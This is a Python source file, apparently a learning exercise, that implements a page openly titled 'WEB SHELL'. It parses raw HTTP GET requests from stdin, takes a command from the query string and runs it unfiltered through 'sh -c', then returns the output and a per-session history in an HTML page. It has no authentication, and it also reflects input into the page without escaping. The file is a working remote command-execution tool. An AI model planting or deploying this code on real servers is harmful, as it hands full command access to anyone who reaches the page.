import json
import os
import sys
import time
import random

res = """
HTTP/1.1 200
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: $(SIZE) 

"""
res2 = """
<!DOCTYPE html>
<html>
<head>
    <title>WEB SHELL 1</title>
</head>
<body style="background-color:black;color:#00FA16;">
	<h1 style="text-align:center"></u><strong>WEB SHELL</strong></u></h1><br>
	<h3><u>HISTORY</u></h3> 
	$(HISTORY)<br>
	<h3><u>LAST CMD :</u> $(DATA)</h3><br>
	<form style="background-color:black;color:#00FA16" action="ajoute$(ID_SESSION)" method="get">
		<input id="textbox" type="text"  style="border:3px solid #46C786;border-radius:10px;width:200px;box-shadow:1px 1px 2px #C0C0C0 inset;" name="saisie" placeholder="Tapez une commande" />
		<input type="submit" name="send" value="&#9166;">
	</form>
	<h3><u>RES CMD :</u></h3> 
	$(RES)
</body>
<script language="javascript">
	var box_input = document.getElementById('textbox');
	box_input.focus();
	box_input.select();
</script> 	
</html>
""" 
def escaped_utf8_to_utf8(s):
    res = b'' ; i = 0
    while i < len(s):
        if s[i] == '%':
            res += int(s[i+1:i+3], base=16).to_bytes(1, byteorder='big')
            i += 3
        else :
            res += bytes(s[i], "utf8")
            i += 1
    return res.decode('utf-8')


def	get_cmd() :
	id_session = ''
	msg = os.read(0, 100000)
	if (msg.decode('utf8').split("\r")[0].split(' ')[0] != "GET" or msg.decode('utf8').split('\r')[0].split(' ')[2] != 'HTTP/1.1') :
		os.write(2, b"request not supported\n")
	else :
		
		#EXTRACT DATA
		data = ''
		if (len(msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")) > 1) :
			data = msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")[1].split("&")[0].split("=")[1].replace('+', ' ')
			data = escaped_utf8_to_utf8(data)
		if (len(msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")) > 1) :
			id_session = msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")[0].replace("ajoute", "").replace("/", "")
		#CREATE RETURN PAQUET
		msg = res2.replace("$(DATA)", data)
		if (len(id_session) == 0) :
			id_session = str(os.getpid())
		msg = msg.replace("$(ID_SESSION)", id_session)
		#Extract HISTORY
		fd = os.open("/tmp/historique" + str(id_session) + ".txt", os.O_CREAT | os.O_APPEND | os.O_RDWR)
		read = os.read(fd, 100000)
		history =  ''
		while (len(read) > 0) :
			history += read.decode('utf8')
			read = os.read(fd, 100000)
		msg = msg.replace("$(HISTORY)", history.replace("\n", "<br>"))
		rd_nb = random.randrange(42, 42424242424242424242, 42) #RANDOM NUMBER
		pipe = os.pipe()
		pid_fork = os.fork()
		if (pid_fork == 0) :
			os.dup2(pipe[1], 1) #STDOUT IN PIPE
			os.dup2(pipe[1], 2) #STDERR IN PIPE
			data = data + " ; " * (len(data) > 0) + "echo " + str(rd_nb)
			os.execvp('sh', ['sh','-c', data])
		else :
			time.sleep(0.1)
			read = True
			res_cmd = ''
			while (read) :
				res_cmd += os.read(pipe[0], 1).decode("utf8")
				if (len(res_cmd) >= len(str(rd_nb)) and res_cmd[-len(str(rd_nb)):] == str(rd_nb)) :
					read = False
			msg = msg.replace("$(RES)", res_cmd.replace(str(rd_nb), "").replace("\n", "<br>"))
		msg = res.replace("$(SIZE)", str(len(msg))).replace('\n', '\n\r') + msg
		os.write(1, bytes(msg, 'utf8'))
		#WRITE IN HISTORY
		if (len(data) > 0) :
			os.write(fd, bytes("<font color='orange'>" + time.strftime("%d/%m/%Y %H:%M:%S") + "$</font> " + data + '\n','utf8'))
			os.write(fd, bytes(res_cmd.replace(str(rd_nb), ""), 'utf8'))
		os.close(fd)
		return (data, history)
	exit (0)
if __name__ == "__main__" :
	data, history = get_cmd()